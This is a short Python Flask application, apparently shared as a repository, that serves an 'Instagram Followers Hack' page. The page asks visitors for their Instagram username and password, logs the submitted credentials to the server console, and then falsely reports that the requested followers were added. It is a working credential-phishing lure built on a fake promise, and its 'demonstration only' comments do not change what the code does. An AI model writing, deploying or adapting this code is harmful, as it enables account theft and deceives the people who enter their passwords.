# Instagram-followers-
from flask import Flask, request

app = Flask(__name__)

@app.route('/')
def index():
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Instagram Followers Hack</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                background-color: #f5f5f5;
                margin: 0;
                padding: 0;
            }
            .container {
                max-width: 500px;
                margin: 50px auto;
                padding: 20px;
                background-color: #fff;
                border-radius: 8px;
                box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
            }
            h2 {
                color: #333;
            }
            label {
                font-weight: bold;
            }
            input[type="text"],
            input[type="password"],
            input[type="number"] {
                width: 100%;
                padding: 10px;
                margin: 8px 0;
                border: 1px solid #ccc;
                border-radius: 5px;
            }
            input[type="checkbox"] {
                margin-right: 5px;
            }
            input[type="submit"] {
                background-color: #4CAF50;
                color: white;
                padding: 12px 20px;
                border: none;
                border-radius: 4px;
                cursor: pointer;
                width: 100%;
            }
            input[type="submit"]:hover {
                background-color: #45a049;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h2>Instagram Followers Hack</h2>
            <p>Welcome to the Instagram Followers Hack!</p>
            <p>Please enter your Instagram credentials and the number of followers you want:</p>
            <form action="/submit" method="post">
                <label for="username">Username:</label><br>
                <input type="text" id="username" name="username"><br>
                <label for="password">Password:</label><br>
                <input type="password" id="password" name="password"><br>
                <input type="checkbox" onclick="showPassword()"> Show Password<br><br>
                <label for="followers">Followers:</label><br>
                <input type="number" id="followers" name="followers" min="0"><br><br>
                <input type="submit" value="Submit">
            </form>
        </div>
        <script>
            function showPassword() {
                var passwordInput = document.getElementById("password");
                if (passwordInput.type === "password") {
                    passwordInput.type = "text";
                } else {
                    passwordInput.type = "password";
                }
            }
        </script>
    </body>
    </html>
    """

@app.route('/submit', methods=['POST'])
def submit():
    username = request.form['username']
    password = request.form['password']
    followers = request.form['followers']
    
    # Check if username and password are provided
    if not (username and password):
        return 'Error: Please provide your Instagram username and password.'
    
    # Check if followers count is provided
    if not followers:
        return 'Error: Please provide the number of followers you want.'
    
    # Simulate the first attempt as unsuccessful (for demonstration purposes only)
    if username == 'incorrect_username' or password == 'incorrect_password':
        return 'Error: No account found. Please try again.'
    
    # Print the username, password, and number of followers to be added to the console
    print(f'Username: {username}, Password: {password}, Followers: {followers}')
    
    # Perform the Instagram followers hack (not really!)
    # Here you can implement the logic to add followers (for demonstration purposes only)
    
    # Respond with a success message
    return f'The number of followers you requested ({followers}) has been added to your account!'

if __name__ == '__main__':
    # Allow external connections on port 8080
    app.run(host='0.0.0.0', port=8080, debug=True)
    
